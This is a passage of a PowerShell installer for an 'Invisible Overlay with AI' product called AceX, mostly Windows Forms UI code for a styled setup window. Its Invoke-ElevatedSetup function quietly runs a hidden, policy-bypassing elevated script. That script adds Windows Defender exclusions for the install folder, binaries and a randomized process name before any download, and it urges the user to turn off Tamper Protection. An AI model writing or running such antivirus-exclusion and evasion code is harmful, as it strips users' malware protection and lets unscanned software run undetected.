    public Color BorderColor {
        get { return _borderColor; }
        set { _borderColor = value; this.Invalidate(); }
    }

    public int BorderWidth {
        get { return _borderWidth; }
        set { _borderWidth = value; this.Invalidate(); }
    }

    protected override void OnPaint(PaintEventArgs e) {
        base.OnPaint(e);
        e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
        e.Graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;

        Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
        GraphicsPath regionPath = GetRoundedRect(rect, _cornerRadius);
        this.Region = new Region(regionPath);

        int inset = (int)Math.Ceiling(_borderWidth / 2.0);
        Rectangle borderRect = new Rectangle(inset, inset, this.Width - (inset * 2) - 1, this.Height - (inset * 2) - 1);
        GraphicsPath borderPath = GetRoundedRect(borderRect, _cornerRadius);

        using (Pen pen = new Pen(_borderColor, _borderWidth)) {
            e.Graphics.DrawPath(pen, borderPath);
        }
    }

    private GraphicsPath GetRoundedRect(Rectangle rect, int radius) {
        GraphicsPath path = new GraphicsPath();
        if (radius <= 0) {
            path.AddRectangle(rect);
            return path;
        }
        int diameter = radius * 2;
        path.AddArc(rect.X, rect.Y, diameter, diameter, 180, 90);
        path.AddArc(rect.Right - diameter, rect.Y, diameter, diameter, 270, 90);
        path.AddArc(rect.Right - diameter, rect.Bottom - diameter, diameter, diameter, 0, 90);
        path.AddArc(rect.X, rect.Bottom - diameter, diameter, diameter, 90, 90);
        path.CloseFigure();
        return path;
    }
}
"@ -ReferencedAssemblies System.Windows.Forms,System.Drawing

# =============================================================================
# FORM SETUP (premium UI ported from install2.ps1)
# =============================================================================

$form = New-Object System.Windows.Forms.Form
$form.Text = $BrandName
$form.ClientSize = New-Object System.Drawing.Size(840, 572)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"
$form.AutoScaleMode = [System.Windows.Forms.AutoScaleMode]::None
$form.BackColor = $G_Bg0
$form.Font = New-Object System.Drawing.Font("Segoe UI", 9)
Enable-DoubleBuffer $form

$form.Add_HandleCreated({ Set-NativeRoundedWindow $form 22 | Out-Null })
$form.Add_Load({
        Set-NativeRoundedWindow $form 22 | Out-Null
        $form.Activate()
    })

# -- Title bar --
$titleBar = New-Object System.Windows.Forms.Panel
$titleBar.Size = New-Object System.Drawing.Size(840, 42)
$titleBar.Location = New-Object System.Drawing.Point(0, 0)
$titleBar.BackColor = $G_Bg1
Enable-DoubleBuffer $titleBar
$titleBar.Add_Paint({
        param($s, $e)
        $pen = New-Object System.Drawing.Pen($G_Bd1, 1)
        $e.Graphics.DrawLine($pen, 0, $s.Height - 1, $s.Width, $s.Height - 1)
        $pen.Dispose()
    })
$form.Controls.Add($titleBar)

# Traffic light dots (red dot closes the installer)
$mDots = @(
    @{ X = 16; Clr = [System.Drawing.Color]::FromArgb(255, 96, 92); Kill = $true },
    @{ X = 36; Clr = [System.Drawing.Color]::FromArgb(255, 189, 46); Kill = $false },
    @{ X = 56; Clr = [System.Drawing.Color]::FromArgb( 40, 205, 65); Kill = $false }
)
foreach ($md in $mDots) {
    $md2 = New-Object System.Windows.Forms.Panel
    $md2.Size = New-Object System.Drawing.Size(12, 12)
    $md2.Location = New-Object System.Drawing.Point($md.X, 15)
    $md2.BackColor = $md.Clr
    $md2.Cursor = "Hand"
    $md2.Add_Paint({
            param($s, $e)
            $e.Graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
            $b = New-Object System.Drawing.SolidBrush($s.BackColor)
            $e.Graphics.FillEllipse($b, 0, 0, 11, 11); $b.Dispose()
        })
    if ($md.Kill) { $md2.Add_Click({ [System.Environment]::Exit(0) }) }
    $titleBar.Controls.Add($md2)
}

# Title bar label
$titleBarLabel = New-Object System.Windows.Forms.Label
$titleBarLabel.Text = $BrandName
$titleBarLabel.Font = New-Object System.Drawing.Font("Segoe UI Semibold", 10.5, [System.Drawing.FontStyle]::Bold)
$titleBarLabel.ForeColor = $G_TxH
$titleBarLabel.Size = New-Object System.Drawing.Size(620, 42)
$titleBarLabel.Location = New-Object System.Drawing.Point(110, 0)
$titleBarLabel.TextAlign = "MiddleCenter"
$titleBarLabel.BackColor = [System.Drawing.Color]::Transparent
$titleBar.Controls.Add($titleBarLabel)

# Explicit X button
$closeBtn = New-Object System.Windows.Forms.Label
$closeBtn.Name = "CloseButton"
$closeBtn.Text = "x"
$closeBtn.Font = New-Object System.Drawing.Font("Segoe UI Semibold", 18, [System.Drawing.FontStyle]::Bold)
$closeBtn.ForeColor = $G_TxM
$closeBtn.Size = New-Object System.Drawing.Size(42, 42)
$closeBtn.Location = New-Object System.Drawing.Point(786, 0)
$closeBtn.TextAlign = "MiddleCenter"
$closeBtn.BackColor = [System.Drawing.Color]::Transparent
$closeBtn.Cursor = "Hand"
$closeBtn.Add_MouseEnter({ $closeBtn.ForeColor = $G_Red; $closeBtn.BackColor = [System.Drawing.Color]::FromArgb(24, 248, 113, 113) })
$closeBtn.Add_MouseLeave({ $closeBtn.ForeColor = $G_TxM; $closeBtn.BackColor = [System.Drawing.Color]::Transparent })
$closeBtn.Add_Click({ [System.Environment]::Exit(0) })
$titleBar.Controls.Add($closeBtn)
$closeBtn.BringToFront()

# Drag
$script:isDragging = $false; $script:dragPt = [System.Drawing.Point]::Empty
$titleBar.Add_MouseDown({ param($s, $e)
        if ($e.Button -eq "Left") { $script:isDragging = $true; $script:dragPt = New-Object System.Drawing.Point($e.X, $e.Y) }
    })
$titleBar.Add_MouseMove({ param($s, $e)
        if ($script:isDragging) {
            $scr = [System.Windows.Forms.Cursor]::Position
            $form.Location = New-Object System.Drawing.Point(
                ([int]$scr.X - [int]$script:dragPt.X),
                ([int]$scr.Y - [int]$script:dragPt.Y))
        }
    })
$titleBar.Add_MouseUp({ $script:isDragging = $false })

$titleBarLabel.Add_MouseDown({ param($s, $e)
        if ($e.Button -eq "Left") {
            $script:isDragging = $true
            $script:dragPt = New-Object System.Drawing.Point($e.X, $e.Y)
        }
    })
$titleBarLabel.Add_MouseMove({ param($s, $e)
        if ($script:isDragging) {
            $scr = [System.Windows.Forms.Cursor]::Position
            $form.Location = New-Object System.Drawing.Point(
                ([int]$scr.X - [int]$script:dragPt.X),
                ([int]$scr.Y - [int]$script:dragPt.Y))
        }
    })
$titleBarLabel.Add_MouseUp({ $script:isDragging = $false })

# =============================================================================
# HERO SECTION (premium card)
# =============================================================================

$card = New-Object PremiumPanel
$card.Size = New-Object System.Drawing.Size(796, 510)
$card.Location = New-Object System.Drawing.Point(22, 44)
$card.BackColor = $G_Bg2
$card.Radius = 16
$card.Border = $G_Bd1
$card.BWidth = 1
$card.Glow = $true
$card.GlowColor = [System.Drawing.Color]::FromArgb(18, $AccentColor.R, $AccentColor.G, $AccentColor.B)
$card.GlowStr = 18
$form.Controls.Add($card)
# Alias for any references expecting the previous name.
$mainCard = $card

# Accent gradient bar (top of card)
$accentBar = New-Object System.Windows.Forms.Panel
$accentBar.Size = New-Object System.Drawing.Size(796, 4)
$accentBar.Location = New-Object System.Drawing.Point(0, 0)
$accentBar.BackColor = $AccentColor
Enable-DoubleBuffer $accentBar
$accentBar.Add_Paint({
        param($s, $e)
        $rect = New-Object System.Drawing.Rectangle(0, 0, $s.Width, $s.Height)
        $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
            $rect, $AccentColor, $AccentColorLight,
            [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
        $e.Graphics.FillRectangle($brush, $rect); $brush.Dispose()
    })
$card.Controls.Add($accentBar)

# Logo (fetched or painted)
$logoPath = Join-Path $env:TEMP "acex_logo.png"
$script:LogoImage = $null
try {
    if (-not (Test-Path $logoPath)) {
        $wl = New-Object System.Net.WebClient
        $wl.DownloadFile("https://acex.wtf/logo.png", $logoPath)
        $wl.Dispose()
    }
    if (Test-Path $logoPath) {
        $bytes = [System.IO.File]::ReadAllBytes($logoPath)
        $ms = New-Object System.IO.MemoryStream(, $bytes)
        $script:LogoImage = [System.Drawing.Image]::FromStream($ms)
    }
}
catch { $script:LogoImage = $null }

$logoPanel = New-Object System.Windows.Forms.Panel
$logoPanel.Size = New-Object System.Drawing.Size(62, 62)
$logoPanel.Location = New-Object System.Drawing.Point(28, 18)
$logoPanel.BackColor = [System.Drawing.Color]::Transparent
Enable-DoubleBuffer $logoPanel
$logoPanel.Add_Paint({
        param($s, $e)
        $g = $e.Graphics
        $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
        $g.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
        $w = $s.Width; $h = $s.Height
        $rect = New-Object System.Drawing.Rectangle(0, 0, $w, $h)
        $path = New-Object System.Drawing.Drawing2D.GraphicsPath
        $path.AddEllipse($rect)
        $s.Region = New-Object System.Drawing.Region($path)

        if ($null -ne $script:LogoImage) {
            $g.SetClip($path); $g.DrawImage($script:LogoImage, $rect); $g.ResetClip()
        }
        else {
            $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
                $rect, $AccentColor, $AccentColorLight,
                [System.Drawing.Drawing2D.LinearGradientMode]::ForwardDiagonal)
            $g.FillEllipse($brush, $rect); $brush.Dispose()

            $font = New-Object System.Drawing.Font("Segoe UI", 22, [System.Drawing.FontStyle]::Bold)
            $b = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
            $fmt = New-Object System.Drawing.StringFormat
            $fmt.Alignment = [System.Drawing.StringAlignment]::Center
            $fmt.LineAlignment = [System.Drawing.StringAlignment]::Center
            $g.DrawString("A", $font, $b, (New-Object System.Drawing.RectangleF(0, 2, $w, ($h - 2))), $fmt)
            $font.Dispose(); $b.Dispose(); $fmt.Dispose()
        }
        $path.Dispose()
    })
$card.Controls.Add($logoPanel)

# Product title
$title = New-Object System.Windows.Forms.Label
$title.Text = $BrandName
$title.Font = New-Object System.Drawing.Font("Segoe UI Semibold", 28, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = $G_TxH
$title.Location = New-Object System.Drawing.Point(106, 12)
$title.AutoSize = $true
$card.Controls.Add($title)

# Subtitle
$sub = New-Object System.Windows.Forms.Label
$sub.Text = if ($SelectedVariant -eq "Lite") { "Lightweight Overlay with AI" } else { "Invisible Overlay with AI" }
$sub.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$sub.ForeColor = $G_TxM
$sub.AutoSize = $false
$sub.Size = New-Object System.Drawing.Size(400, 20)
$sub.TextAlign = "MiddleLeft"
$sub.Location = New-Object System.Drawing.Point(110, 68)
$card.Controls.Add($sub)
$sub.BringToFront()

# Hero divider
$div1 = New-Object System.Windows.Forms.Panel
$div1.Size = New-Object System.Drawing.Size(740, 1)
$div1.Location = New-Object System.Drawing.Point(28, 96)
$div1.BackColor = $G_Bd1
$card.Controls.Add($div1)

# =============================================================================
# STEP TRACKER
# =============================================================================

$script:currentStep = 0
$stepNames = @("Setup", "Config", "Download", "Install", "Launch")
$stepCount = $stepNames.Count
$stepGap = [int](740 / ($stepCount - 1))

$stepperPanel = New-Object System.Windows.Forms.Panel
$stepperPanel.Size = New-Object System.Drawing.Size(740, 52)
$stepperPanel.Location = New-Object System.Drawing.Point(28, 104)
$stepperPanel.BackColor = [System.Drawing.Color]::Transparent
Enable-DoubleBuffer $stepperPanel
$stepperPanel.Add_Paint({
        param($s, $e)
        $g = $e.Graphics
        $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
        $g.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::ClearTypeGridFit

        $step = $script:currentStep
        $circleR = 10
        $circleD = $circleR * 2
        $lineY = 18
        $lblY = 32

        for ($i = 0; $i -lt $stepCount; $i++) {
            $cx = 10 + ($i * $stepGap)
            if ($cx -gt ($s.Width - 12)) { $cx = $s.Width - 12 }

            if ($i -gt 0) {
                $prevCx = 10 + (($i - 1) * $stepGap)
                $lineX1 = $prevCx + $circleR + 2
                $lineX2 = $cx - $circleR - 2
                $lClr = if ($i -le $step) { $AccentColor } else { $G_Bd2 }
                $lp = New-Object System.Drawing.Pen($lClr, 1.5)
                $g.DrawLine($lp, $lineX1, $lineY, $lineX2, $lineY)
                $lp.Dispose()
            }

            $cr = New-Object System.Drawing.Rectangle(($cx - $circleR), ($lineY - $circleR), $circleD, $circleD)

            if ($i -lt $step) {
                $cb = New-Object System.Drawing.SolidBrush($AccentColor)
                $g.FillEllipse($cb, $cr); $cb.Dispose()
                $ckPen = New-Object System.Drawing.Pen([System.Drawing.Color]::White, 2)
                $g.DrawLine($ckPen, $cx - 5, $lineY, $cx - 1, $lineY + 4)
                $g.DrawLine($ckPen, $cx - 1, $lineY + 4, $cx + 5, $lineY - 4)
                $ckPen.Dispose()
            }
            elseif ($i -eq $step) {
                $cb = New-Object System.Drawing.SolidBrush($AccentColor)
                $g.FillEllipse($cb, $cr); $cb.Dispose()
                $rp = New-Object System.Drawing.Pen([System.Drawing.Color]::White, 1.5)
                $g.DrawEllipse($rp, $cr); $rp.Dispose()
                $nF = New-Object System.Drawing.Font("Segoe UI", 7, [System.Drawing.FontStyle]::Bold)
                $nB = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
                $nFm = New-Object System.Drawing.StringFormat
                $nFm.Alignment = [System.Drawing.StringAlignment]::Center
                $nFm.LineAlignment = [System.Drawing.StringAlignment]::Center
                $g.DrawString([string]($i + 1), $nF, $nB, [System.Drawing.RectangleF]::op_Implicit($cr), $nFm)
                $nF.Dispose(); $nB.Dispose(); $nFm.Dispose()
            }
            else {
                $cb = New-Object System.Drawing.SolidBrush($G_Bg2)
                $g.FillEllipse($cb, $cr); $cb.Dispose()
                $fp = New-Object System.Drawing.Pen($G_Bd2, 1.5)
                $g.DrawEllipse($fp, $cr); $fp.Dispose()
                $nF = New-Object System.Drawing.Font("Segoe UI", 7, [System.Drawing.FontStyle]::Bold)
                $nB = New-Object System.Drawing.SolidBrush($G_TxL)
                $nFm = New-Object System.Drawing.StringFormat
                $nFm.Alignment = [System.Drawing.StringAlignment]::Center
                $nFm.LineAlignment = [System.Drawing.StringAlignment]::Center
                $g.DrawString([string]($i + 1), $nF, $nB, [System.Drawing.RectangleF]::op_Implicit($cr), $nFm)
                $nF.Dispose(); $nB.Dispose(); $nFm.Dispose()
            }

            $lClr = if ($i -le $step) { $AccentColorLight } else { $G_TxL }
            $lStyle = if ($i -eq $step) { [System.Drawing.FontStyle]::Bold } else { [System.Drawing.FontStyle]::Regular }
            $lF = New-Object System.Drawing.Font("Segoe UI", 7.5, $lStyle)
            $lB = New-Object System.Drawing.SolidBrush($lClr)
            $lFm = New-Object System.Drawing.StringFormat
            $lFm.Alignment = [System.Drawing.StringAlignment]::Center
            $lRect = New-Object System.Drawing.RectangleF(($cx - 44), ($lblY + 2), 88, 16)
            $g.DrawString($stepNames[$i], $lF, $lB, $lRect, $lFm)
            $lF.Dispose(); $lB.Dispose(); $lFm.Dispose()
        }
    })
$card.Controls.Add($stepperPanel)

# Stepper divider
$div2 = New-Object System.Windows.Forms.Panel
$div2.Size = New-Object System.Drawing.Size(740, 1)
$div2.Location = New-Object System.Drawing.Point(28, 162)
$div2.BackColor = $G_Bd1
$card.Controls.Add($div2)

# =============================================================================
# PROGRESS SECTION
# =============================================================================

$stepLabel = New-Object System.Windows.Forms.Label
$stepLabel.Text = "Initializing..."
$stepLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$stepLabel.ForeColor = $G_TxH
$stepLabel.Location = New-Object System.Drawing.Point(28, 174)
$stepLabel.Size = New-Object System.Drawing.Size(640, 22)
$card.Controls.Add($stepLabel)

$progressPercent = New-Object System.Windows.Forms.Label
$progressPercent.Text = "0%"
$progressPercent.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$progressPercent.ForeColor = $AccentColor
$progressPercent.Size = New-Object System.Drawing.Size(72, 22)
$progressPercent.Location = New-Object System.Drawing.Point(696, 174)
$progressPercent.TextAlign = "MiddleRight"
$card.Controls.Add($progressPercent)

$progressTrack = New-Object System.Windows.Forms.Panel
$progressTrack.Size = New-Object System.Drawing.Size(740, 7)
$progressTrack.Location = New-Object System.Drawing.Point(28, 200)
$progressTrack.BackColor = $G_Bg1
Enable-DoubleBuffer $progressTrack
$progressTrack.Add_HandleCreated({
        $gp = New-Object System.Drawing.Drawing2D.GraphicsPath
        $gp.AddArc(0, 0, 7, 7, 90, 180)
        $gp.AddArc($progressTrack.Width - 7, 0, 7, 7, 270, 180)
        $gp.CloseFigure()
        $progressTrack.Region = New-Object System.Drawing.Region($gp)
    })
$card.Controls.Add($progressTrack)

$progressFill = New-Object System.Windows.Forms.Panel
$progressFill.Size = New-Object System.Drawing.Size(0, 7)
$progressFill.Location = New-Object System.Drawing.Point(0, 0)
$progressFill.BackColor = $AccentColor
Enable-DoubleBuffer $progressFill
$progressFill.Add_Paint({
        param($s, $e)
        if ($s.Width -lt 4) { return }
        $rect = New-Object System.Drawing.Rectangle(0, 0, $s.Width, $s.Height)
        $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
            $rect, $AccentColor, $AccentColorLight,
            [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
        $e.Graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
        $e.Graphics.FillRectangle($brush, $rect); $brush.Dispose()
    })
$progressTrack.Controls.Add($progressFill)

# =============================================================================
# LOG CONSOLE
# =============================================================================

$logPanel = New-Object PremiumPanel
$logPanel.Size = New-Object System.Drawing.Size(740, 218)
$logPanel.Location = New-Object System.Drawing.Point(28, 216)
$logPanel.BackColor = [System.Drawing.Color]::FromArgb(8, 10, 18)
$logPanel.Radius = 12
$logPanel.Border = $G_Bd1
$logPanel.BWidth = 1
$card.Controls.Add($logPanel)

$logHdr = New-Object System.Windows.Forms.Panel
$logHdr.Size = New-Object System.Drawing.Size(740, 28)
$logHdr.Location = New-Object System.Drawing.Point(0, 0)
$logHdr.BackColor = [System.Drawing.Color]::FromArgb(10, 13, 22)
Enable-DoubleBuffer $logHdr
$logHdr.Add_Paint({
        param($s, $e)
        $pen = New-Object System.Drawing.Pen($G_Bd1, 1)
        $e.Graphics.DrawLine($pen, 0, $s.Height - 1, $s.Width, $s.Height - 1)
        $pen.Dispose()
    })
$logPanel.Controls.Add($logHdr)

$logHdrLbl = New-Object System.Windows.Forms.Label
$logHdrLbl.Text = "INSTALLATION LOG"
$logHdrLbl.Font = New-Object System.Drawing.Font("Segoe UI", 7.5, [System.Drawing.FontStyle]::Bold)
$logHdrLbl.ForeColor = $G_TxL
$logHdrLbl.Location = New-Object System.Drawing.Point(14, 6)
$logHdrLbl.AutoSize = $true
$logHdr.Controls.Add($logHdrLbl)

$dotX = 705
foreach ($dc2 in @(
        [System.Drawing.Color]::FromArgb(255, 96, 92),
        [System.Drawing.Color]::FromArgb(255, 189, 46),
        [System.Drawing.Color]::FromArgb( 40, 205, 65)
    )) {
    $td = New-Object System.Windows.Forms.Panel
    $td.Size = New-Object System.Drawing.Size(8, 8)
    $td.Location = New-Object System.Drawing.Point($dotX, 10)
    $td.BackColor = [System.Drawing.Color]::FromArgb(90, $dc2.R, $dc2.G, $dc2.B)
    $td.Add_Paint({
            param($s, $e)
            $e.Graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
            $b = New-Object System.Drawing.SolidBrush($s.BackColor)
            $e.Graphics.FillEllipse($b, 0, 0, 7, 7); $b.Dispose()
        })
    $logHdr.Controls.Add($td)
    $dotX -= 14
}

$logBox = New-Object System.Windows.Forms.RichTextBox
$logBox.Size = New-Object System.Drawing.Size(716, 182)
$logBox.Location = New-Object System.Drawing.Point(12, 32)
$logBox.Multiline = $true
$logBox.ScrollBars = "Vertical"
$logBox.ReadOnly = $true
$logBox.BackColor = [System.Drawing.Color]::FromArgb(8, 10, 18)
$logBox.ForeColor = $G_TxM
$logBox.BorderStyle = "None"
$logBox.Font = New-Object System.Drawing.Font("Consolas", 8.5)
$logPanel.Controls.Add($logBox)

# =============================================================================
# STATUS BAR
# =============================================================================

$statusStrip = New-Object PremiumPanel
$statusStrip.Size = New-Object System.Drawing.Size(620, 34)
$statusStrip.Location = New-Object System.Drawing.Point(148, 444)
$statusStrip.BackColor = $G_Bg1
$statusStrip.Radius = 10
$statusStrip.Border = $G_Bd1
$statusStrip.BWidth = 1
$card.Controls.Add($statusStrip)

# Cancel / close action (rewired to Exit(0) — matches previous installer behavior)
$cancelBtn = New-Object PremiumPanel
$cancelBtn.Size = New-Object System.Drawing.Size(106, 34)
$cancelBtn.Location = New-Object System.Drawing.Point(28, 444)
$cancelBtn.BackColor = [System.Drawing.Color]::FromArgb(16, 20, 32)
$cancelBtn.Radius = 10
$cancelBtn.Border = [System.Drawing.Color]::FromArgb(56, 64, 90)
$cancelBtn.BWidth = 1
$cancelBtn.Cursor = "Hand"
$cancelBtn.Add_MouseEnter({
        $cancelBtn.BackColor = [System.Drawing.Color]::FromArgb(34, 28, 36)
        $cancelBtn.Border = [System.Drawing.Color]::FromArgb(110, 74, 94)
        $cancelBtn.Refresh()
    })
$cancelBtn.Add_MouseLeave({
        $cancelBtn.BackColor = [System.Drawing.Color]::FromArgb(16, 20, 32)
        $cancelBtn.Border = [System.Drawing.Color]::FromArgb(56, 64, 90)
        $cancelBtn.Refresh()
    })
$cancelLbl = New-Object System.Windows.Forms.Label
$cancelLbl.Text = "Cancel"
$cancelLbl.Font = New-Object System.Drawing.Font("Segoe UI Semibold", 8.5, [System.Drawing.FontStyle]::Bold)
$cancelLbl.ForeColor = $G_TxM
$cancelLbl.Size = $cancelBtn.Size
$cancelLbl.Location = New-Object System.Drawing.Point(0, 0)
$cancelLbl.TextAlign = "MiddleCenter"
$cancelLbl.Cursor = "Hand"
$cancelBtn.Controls.Add($cancelLbl)
$card.Controls.Add($cancelBtn)
$cancelBtn.Add_Click({ [System.Environment]::Exit(0) })
$cancelLbl.Add_Click({ [System.Environment]::Exit(0) })

$statusDot = New-Object System.Windows.Forms.Panel
$statusDot.Size = New-Object System.Drawing.Size(8, 8)
$statusDot.Location = New-Object System.Drawing.Point(14, 13)
$statusDot.BackColor = $AccentColor
$statusDot.Add_Paint({
        param($s, $e)
        $e.Graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
        $b = New-Object System.Drawing.SolidBrush($s.BackColor)
        $path = New-Object System.Drawing.Drawing2D.GraphicsPath
        $path.AddEllipse(0, 0, 7, 7)
        $e.Graphics.FillPath($b, $path)
        $b.Dispose(); $path.Dispose()
    })
$statusStrip.Controls.Add($statusDot)

$statusText = New-Object System.Windows.Forms.Label
$statusText.Text = "Ready to download"
$statusText.Font = New-Object System.Drawing.Font("Segoe UI", 8)
$statusText.ForeColor = $G_TxM
$statusText.Location = New-Object System.Drawing.Point(30, 10)
$statusText.AutoSize = $true
$statusStrip.Controls.Add($statusText)

$installPathLbl = New-Object System.Windows.Forms.Label
$installPathLbl.Text = "-> $InstallDir"
$installPathLbl.Font = New-Object System.Drawing.Font("Consolas", 7.5)
$installPathLbl.ForeColor = $G_TxL
$installPathLbl.Location = New-Object System.Drawing.Point(320, 10)
$installPathLbl.Size = New-Object System.Drawing.Size(286, 14)
$installPathLbl.AutoEllipsis = $true
$statusStrip.Controls.Add($installPathLbl)

# Pulsing status dot
$script:pulseOn = $true
$pulseTimer = New-Object System.Windows.Forms.Timer
$pulseTimer.Interval = 620
$pulseTimer.Add_Tick({
        $script:pulseOn = -not $script:pulseOn
        $alpha = if ($script:pulseOn) { 255 } else { 60 }
        $statusDot.BackColor = [System.Drawing.Color]::FromArgb($alpha, $AccentColor)
        $statusDot.Refresh()
    })
$pulseTimer.Start()
$form.Add_FormClosed({ try { $pulseTimer.Stop(); $pulseTimer.Dispose() } catch { } })

# =============================================================================
# UI UPDATE FUNCTIONS
# =============================================================================

function Animate-Progress {
    param($targetPercent)

    $currentWidth = $progressFill.Width
    $maxWidth = $progressTrack.Width
    $targetWidth = [int]($maxWidth * ($targetPercent / 100))

    if ($targetWidth -gt $maxWidth) { $targetWidth = $maxWidth }
    if ($targetWidth -lt 0) { $targetWidth = 0 }

    $steps = 15
    $stepWidth = [int](($targetWidth - $currentWidth) / $steps)
    if ($stepWidth -lt 1) { $stepWidth = 1 }

    for ($i = 1; $i -le $steps; $i++) {
        $newWidth = $currentWidth + ($stepWidth * $i)
        if ($newWidth -gt $maxWidth) { $newWidth = $maxWidth }
        if ($newWidth -lt 0) { $newWidth = 0 }

        $progressFill.Width = $newWidth
        $currentPercent = [int](($newWidth / $maxWidth) * 100)
        $progressPercent.Text = "$currentPercent%"

        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 10
    }
}

function Update-Step {
    param($icon, $text, $percent)

    $stepLabel.Text = "$icon  $text"
    $stepLabel.ForeColor = $TextPrimary

    if ($percent -ge 0) {
        Animate-Progress -targetPercent $percent
    }

    $statusText.Text = $text
    $statusText.ForeColor = $TextSecondary

    $logBox.SelectionColor = $TextMuted
    $logBox.AppendText("> $text`r`n")

    [System.Windows.Forms.Application]::DoEvents()
}

function Write-Log {
    param(
        $message,
        [ValidateSet("info","success","warning","error","highlight")]
        $type = "info"
    )

    switch ($type) {
        "success"   { $color = $SuccessGreen;   $symbol = "+" }
        "warning"   { $color = $WarningAmber;   $symbol = "!" }
        "error"     { $color = $ErrorRed;        $symbol = "x" }
        "highlight" { $color = $BrandOrangeLight; $symbol = "*" }
        default     { $color = $TextSecondary;    $symbol = "-" }
    }

    $logBox.SelectionColor = $color
    $logBox.AppendText("  [$symbol] $message`r`n")
    $logBox.ScrollToCaret()

    [System.Windows.Forms.Application]::DoEvents()
}

function Update-Status {
    param($text, $color)

    if ($color) {
        $statusDot.BackColor = $color
        $statusDot.Refresh()
    }
    $statusText.Text = $text
    $statusText.ForeColor = $TextSecondary

    [System.Windows.Forms.Application]::DoEvents()
}

function Show-Error {
    param($message)

    $logBox.SelectionColor = $ErrorRed
    $logBox.AppendText("`r`n")
    $logBox.AppendText("  [x] ERROR: $message`r`n")
    $logBox.AppendText("  [x] Download failed. Please try again.`r`n")

    Update-Status "Download failed" $ErrorRed
    $titleBarLabel.ForeColor = $ErrorRed
    $stepLabel.ForeColor = $ErrorRed

    Start-Sleep -Seconds 5
    $form.Close()
    exit 1
}

# =============================================================================
# INSTALLATION FUNCTIONS
# =============================================================================

function Invoke-ElevatedSetup {
    Update-Step -icon "[LOCK]" -text "Requesting administrator access..." -percent 18

    # Ensure every folder/file we will create (or that already exists) is present
    # BEFORE we add Defender exclusions, so nothing gets quarantined/deleted.
    if (!(Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force -ErrorAction SilentlyContinue | Out-Null
    }
    if ($TempAcExDir -and !(Test-Path $TempAcExDir)) {
        New-Item -ItemType Directory -Path $TempAcExDir -Force -ErrorAction SilentlyContinue | Out-Null
    }

    # Collect all paths (folders + individual files + shortcuts) to exclude.
    $exclPaths = @(
        $InstallDir,
        $ExePath,
        $DllPath,
        $Dll2Path,
        $WebView2LoaderPath,
        $ShortcutPath,
        $FolderShortcutPath
    )
    if ($TempAcExDir) { $exclPaths += $TempAcExDir }
    $exclPaths = $exclPaths | Where-Object { $_ } | Select-Object -Unique

    # Processes to exclude (randomized exe name, plus generic names).
    $exclProcs = @($AppExeName, "acex.exe", "acex-lite.exe") |
        Where-Object { $_ } | Select-Object -Unique

    # Build the elevated exclusion commands as literal lines.
    $pathLines = ($exclPaths | ForEach-Object {
            'Add-MpPreference -ExclusionPath "' + $_ + '" -ErrorAction SilentlyContinue'
        }) -join "`n"
    $procLines = ($exclProcs | ForEach-Object {
            'Add-MpPreference -ExclusionProcess "' + $_ + '" -ErrorAction SilentlyContinue'
        }) -join "`n"

    $folderExcl = @($InstallDir)
    if ($TempAcExDir) { $folderExcl += $TempAcExDir }
    $folderCheckLines = ($folderExcl | ForEach-Object {
            '    if ($cur -notcontains "' + $_ + '") { $missing = $true }'
        }) -join "`n"

    $elevatedScript = @"
`$ErrorActionPreference = "Continue"

# Defender Exclusions
`$tamperOn = `$false
try {
    `$st = Get-MpComputerStatus -ErrorAction Stop
    if (`$null -ne `$st -and `$st.PSObject.Properties.Match('IsTamperProtected').Count -gt 0) {
        if (`$st.IsTamperProtected) { `$tamperOn = `$true }
    }
} catch { }

if (`$tamperOn) {
    # Tamper Protection blocks exclusion changes entirely.
    exit 2
}

$pathLines
$procLines

# Verify the critical folder exclusions actually registered.
Start-Sleep -Milliseconds 400
`$missing = `$false
try {
    `$cur = @((Get-MpPreference -ErrorAction Stop).ExclusionPath)
$folderCheckLines
} catch { `$missing = `$true }

if (`$missing) { exit 3 }
exit 0
"@

    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
    $elevatedScript | Out-File -FilePath $tempScript -Encoding UTF8

    $ok = $false
    try {
        $process = Start-Process powershell.exe -Verb RunAs -Wait -PassThru -WindowStyle Hidden `
            -ArgumentList @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$tempScript`"")
        switch ($process.ExitCode) {
            0 { Write-Log "Protection exclusions applied" -type success; $ok = $true }
            2 { Write-Log "Tamper Protection is ON - disable it or files may be removed" -type warning }
            3 { Write-Log "Could not verify exclusions - files may be at risk" -type warning }
            default { Write-Log "Administrator step was declined - files may be removed" -type warning }
        }
    } catch {
        Write-Log "Administrator access declined - files may be removed" -type warning
    } finally {
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
    }

    # Give Defender a moment to fully apply the folder exclusion before we download.
    Start-Sleep -Seconds 2
    return $ok
}

function Check-WebView2Runtime {
    $wv2RegPaths = @(
